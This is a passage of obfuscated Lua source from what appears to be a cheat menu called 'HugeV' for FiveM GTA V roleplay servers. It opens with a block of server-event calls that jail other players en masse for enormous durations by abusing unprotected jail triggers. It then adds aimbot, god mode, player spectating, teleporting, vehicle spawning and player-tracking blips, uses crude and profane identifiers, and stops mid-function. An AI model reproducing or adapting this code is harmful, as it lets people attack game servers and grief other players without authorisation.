			TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jaler:sendToWiezz", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937 * 60, "HugeV Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT")
			TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT")
			TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("projektsantos:wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:jail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("projektsantos:wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("luki_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("arisonarp:wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 999999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 1,2137)
			TriggerServerEvent("esxjailer:sendToJail2", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent('esx:wiezienie', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailers:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("arisonarp:wiezienie",  GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jail:sendTooJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendTooJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailers:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 99999 * 60, "HugeV Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999 * 60, "HugeV Private SKRRTTTT", 9999)
			TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 100 * 60, "HugeV Private SKRRTTTT", 999)
			TriggerServerEvent("esx-qalle-jail:wyslijwiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 60*1, "HugeV Private SKRRTTTT", 111)
	end
  end]]
  
  local function full_tuning_dugisdgdsfgidf(vehicle_dugsdifg)
                    Czitirzen_Invoke(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
                    Czitirzen_Invoke(0x487EB21CC7295BA1, vehicle_dugsdifg, 7)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 0, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 0) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 1, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 1) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 2, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 2) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 3, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 3) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 4, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 4) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 5, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 5) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 6, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 6) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 7, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 7) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 8, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 8) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 9, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 9) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 10, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 10) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 11) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 12) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 13) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 14, 16, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 15) - 2, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 16) - 1, false)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 20, true)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
                    Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 22, true)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 23, 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 24, 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 25, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 25) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 27, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 27) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 28, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 28) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 30, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 30) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 33, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 33) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 34, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 34) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 35, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 35) - 1, false)
                    Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 38, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 38) - 1, true)
                    Czitirzen_Invoke(0x57C51E6BAD752696, vehicle_dugsdifg, 1)
                    Czitirzen_Invoke(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
                    Czitirzen_Invoke(0x9088EB5A43FFB0A1, vehicle_dugsdifg, 5)
				end
				
    function full_tuning_pref_dugisdgdsfgidf(vehicle_dugsdifg)
        Czitirzen_Invoke(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
        Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 11) - 1, false)
        Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 12) - 1, false)
        Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 13) - 1, false)
        Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 15) - 2, false)
        Czitirzen_Invoke(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 16) - 1, false)
        Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
        Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
        Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
        Czitirzen_Invoke(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
        Czitirzen_Invoke(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
    end
	
  local function OMGGGGG_SOO_SEXY_BROOM_LICK_MY_SPERM()
                local vrvvgvhyhyvyhyhvtryhvvyhrthyv= "Oppressor2"
                ped_jgtirgirtjhilrthrth = Czitirzen_Invoke(0x43A66C31C68491C0, -1)
				RequestModelSync_SDUFHSIDGSDG(vrvvgvhyhyvyhyhvtryhvvyhrthyv)
                local ybvvyvyhvyhrvhyryhvvhr =
                    Czitirzen_Invoke(0xAF35D0D2583051B0, Czitirzen_Invoke(0xD24D37CC275948CC, vrvvgvhyhyvyhyhvtryhvvyhrthyv), GetEntityCoords_HugeV_UDHGIUDIKGDFG(ped_jgtirgirtjhilrthrth), GetEntityHeading_HugeV_UDYUGDHIGKDFG(ped_jgtirgirtjhilrthrth) + 90, true, true)
                full_tuning_dugisdgdsfgidf(ybvvyvyhvyhrvhyryhvvhr)
                Czitirzen_Invoke(0xEA1C610A04DB6BBB, ybvvyvyhvyhrvhyryhvvhr , false, 0.0)
                Czitirzen_Invoke(0xF75B0D629E1C063D, ped_jgtirgirtjhilrthrth, ybvvyvyhvyhrvhyryhvvhr , -1)
                local htykukyukyukyulyu = Czitirzen_Invoke(0xD24D37CC275948CC, "prop_dummy_plane")
                local vjrujutjuyjvuy = Czitirzen_Invoke(0x509D5878EB39E842, htykukyukyukyulyu , 0.0, 0.0, 0.0, true, true, true)
                if Czitirzen_Invoke(0x7239B21A38F536BA, ybvvyvyhvyhrvhyryhvvhr ) then
                    Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                        vjrujutjuyjvuy,
                        ybvvyvyhvyhrvhyryhvvhr,
                        0.4,
                        IntToFloat_NUGTHBGNURTHNHTR(0.0),
                        0.0,
                        0.3,
                        0.0,
                        IntToFloat_NUGTHBGNURTHNHTR(0.0),
                        IntToFloat_NUGTHBGNURTHNHTR(180),
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                end
            end
			
local function TeleportToCoords_HugeV_UGDOISFGDFG()
	local x_udgoisdfgdg = KeyBoardInput_jdhgijslrgeg("Enter X Pos", "", 100)
	local y_opisdyguds = KeyBoardInput_jdhgijslrgeg("Enter Y Pos", "", 100)
	local z_tdsa8f7gisddfs = KeyBoardInput_jdhgijslrgeg("Enter Z Pos", "", 100)
	local entity_idsuyhgoidsdfg
	if x_udgoisdfgdg ~= ""and y_opisdyguds ~= ""and z_tdsa8f7gisddfs ~= ""then
		if Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0x43A66C31C68491C0, -1),0) and GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1),0),-1)==Czitirzen_Invoke(0x43A66C31C68491C0, -1) then 
			entity_idsuyhgoidsdfg = GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1),0)
		else
			entity_idsuyhgoidsdfg = Czitirzen_Invoke(0xD80958FC74E988A6)
		end
		if entity_idsuyhgoidsdfg then
			Czitirzen_Invoke(0x06843DA7060A026B, entity_idsuyhgoidsdfg, x_udgoisdfgdg + 0.5, y_opisdyguds + 0.5, z_tdsa8f7gisddfs + 0.5, 1,0,0,1)
		end
	else
		PushNotification_DSGJHDSGHSIDUGDS("Invalid coords!")
	end
end



local function OMGIREALYNEEDSTOCHANGEYOUMOTHERFUCKER(entity_DUHGIUDSFHGIUDFGDF)
    if not NetworkIsInSession() or Czitirzen_Invoke(0x01BF60A500E28887, entity_DUHGIUDSFHGIUDFGDF) then
        return true
    end
    Czitirzen_Invoke(0x299EEB23175895FC, Czitirzen_Invoke(0x9E35DAB6, entity_DUHGIUDSFHGIUDFGDF), true)
    return Czitirzen_Invoke(0xB69317BF5E782347, entity_DUHGIUDSFHGIUDFGDF)
end

local function SpectatePlayer_IDUHYISOUHGIUFSGDFG(player_ifhgsdiugdsfg)
        local playerped_iudgf8isdufgsdfg = Czitirzen_Invoke(0xD80958FC74E988A6, -1)
        Spectating_IUDHUFISLFGDFG = not Spectating_IUDHUFISLFGDFG
        local targetPed_udfhdgsiofudsfg = Czitirzen_Invoke(0x43A66C31C68491C0, player_ifhgsdiugdsfg)

        if (Spectating_IUDHUFISLFGDFG) then
          local targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(targetPed_udfhdgsiofudsfg, false))

          Czitirzen_Invoke(0x07503F7948F491A7, targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg)
          Czitirzen_Invoke(0x423DE3854BB50894, true, targetPed_udfhdgsiofudsfg)

          PushNotification_DSGJHDSGHSIDUGDS("Spectating ".. GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg), false)
        else
          local targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(targetPed_udfhdgsiofudsfg, false))

          Czitirzen_Invoke(0x07503F7948F491A7, targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg)
          Czitirzen_Invoke(0x423DE3854BB50894, false, targetPed_udfhdgsiofudsfg)

          PushNotification_DSGJHDSGHSIDUGDS("Stopped Spectating ".. GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg), false)
        end
      end
	  
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
Czlowiek_Wait_IDYGOSIFJGDFG(0)
if legit_aimbot_toogle_duygsudhkgsdfgsdfg then
    
    local plist_iduygusdigsdfg = GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()
    for i_didsfyg98sduriesdfg = 1, #plist_iduygusdigsdfg do
        legit_aimbot_UGDUYFHDSIGKHUIDFGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg]))
    end

end

end
end)

CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
Czlowiek_Wait_IDYGOSIFJGDFG(0)

if display_radar_DSGHSDUGSDG then
Czitirzen_Invoke(0xA0EBB943C300E693, true, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

if watermark_hugev_dugshdioufgsdf then
DrawTxt_fsd7g8reuigsdf("~w~[~r~HugeV~s~]",0.9,0.915,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Resource: ~r~"..GetResourceName_HugeV_dihgsidlgudfsgd(),0.9,0.960,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Server IP: ~r~"..GetServerIP_HugeV_udgshgksudigksdf(),0.9,0.945,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Server ID: ~r~"..GetYouId_HugeV_idasygiosuglsdf(),0.9,0.930,0.0,0.2)
end

if draw_aimbot_fov_DHGSIUGDSGDF and legit_aimbot_toogle_duygsudhkgsdfgsdfg then
    if current_fov_SUHFIUSDFSDF == 1 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.115, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.115, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.11, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.11, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	elseif current_fov_SUHFIUSDFSDF == 2 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.215, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.215, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.21, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.21, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	elseif current_fov_SUHFIUSDFSDF == 3 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.415, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.415, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.41, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.41, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	end
end

if nieskonczona_kondycja_rozumiesz_dighs9ogh8gsfdg then
    Czitirzen_Invoke(0xA352C1B864CAFD33, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.0)
end

if God_Mode_Mala_Kurwo_sufgdsioufsldsdf then
	Czitirzen_Invoke(0x3882114BDE571AD4, Czitirzen_Invoke(0x43A66C31C68491C0, -1), true)
	Czitirzen_Invoke(0x239528EACDC3E7DE, Czitirzen_Invoke(0x4F8644AF03D0E0D6), true)
	Czitirzen_Invoke(0x8FE22675A5A45817, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0x3AC1F7B898F30C05, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0x0E98F88A24C5F4B8, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0xFAEE099C6F890BB8, Czitirzen_Invoke(0x43A66C31C68491C0, -1), true, true, true, true, true, true, true, true)
	Czitirzen_Invoke(0x79F020FF9EDC0748, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false)
	Czitirzen_Invoke(0x1760FFA8AB074D66, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false)
else
	Czitirzen_Invoke(0x3882114BDE571AD4, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false)
	Czitirzen_Invoke(0x239528EACDC3E7DE, Czitirzen_Invoke(0x4F8644AF03D0E0D6), false)
	Czitirzen_Invoke(0x0E98F88A24C5F4B8, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0xFAEE099C6F890BB8, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false, false, false, false, false, false, false, false)
	Czitirzen_Invoke(0x79F020FF9EDC0748, Czitirzen_Invoke(0x43A66C31C68491C0, -1), true)
	Czitirzen_Invoke(0x1760FFA8AB074D66, Czitirzen_Invoke(0x43A66C31C68491C0, -1), true)
end


if #cachedNotifications_DSIGHSIDGSD > 0 then
    for notificationIndex_DSUGSDIGSDG = 1, #cachedNotifications_DSIGHSIDGSD do
        local notification_ASDFUSDIGSDG = cachedNotifications_DSIGHSIDGSD[notificationIndex_DSUGSDIGSDG]

        if notification_ASDFUSDIGSDG then
            notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'] = (notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'] or (notification_ASDFUSDIGSDG['time_DSGIUSDGSDG'] / 1000) * 60) - 1

            local offset_AFUHDSIUFSDGDSG = 0.005 + (notificationIndex_DSUGSDIGSDG * .05)
            local notificationTimer_ADUFYDSIUGSDG = (Czitirzen_Invoke(0x9CD27B0045628463) - notification_ASDFUSDIGSDG['startTime_DSGISDOGSDG']) / notification_ASDFUSDIGSDG['time_DSGIUSDGSDG'] * 100

            Draw3d_SDGIUSDIOGSDG(0.5, 0.8 * offset_AFUHDSIUFSDGDSG, notification_ASDFUSDIGSDG['text_DSGUSIDGSDG'], notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'])

            if notificationTimer_ADUFYDSIUGSDG >= 100 then
                removeNotification_DIGOHSDIGSDG(notificationIndex_DSUGSDIGSDG)
            end
        end
    end
end

		if playerBlips_ADSIUSDIGHISUDGGIDSGSD then
			-- show blips
			local plist_DSGUSDIGDS = GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()
			for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
				local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
				local ped_DSGUISDGSDG = Czitirzen_Invoke(0x43A66C31C68491C0, id_DSHGSIUDGSD)
				if ped_DSGUISDGSDG ~= Czitirzen_Invoke(0xD80958FC74E988A6) then
					local blip_DSUFSDGSD = Czitirzen_Invoke(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)

